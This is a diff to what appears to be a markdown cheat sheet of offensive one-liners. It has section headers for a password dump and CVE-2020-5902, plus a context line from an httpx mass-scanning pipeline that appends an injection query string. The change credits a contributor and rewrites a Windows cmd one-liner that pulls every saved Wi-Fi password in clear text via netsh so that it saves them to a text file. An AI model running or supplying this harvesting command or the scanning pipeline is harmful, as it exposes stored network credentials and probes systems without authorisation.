@@ -43,8 +43,9 @@ cat FILE.txt | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__pr
 ```
 
 ### Passowrd Dump 
+>@SecuritySphinx
 ```bash
-for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" ((echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") & echo.)
+for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") >> Wifi-password.txt
 ```
 
 ### CVE-2020-5902
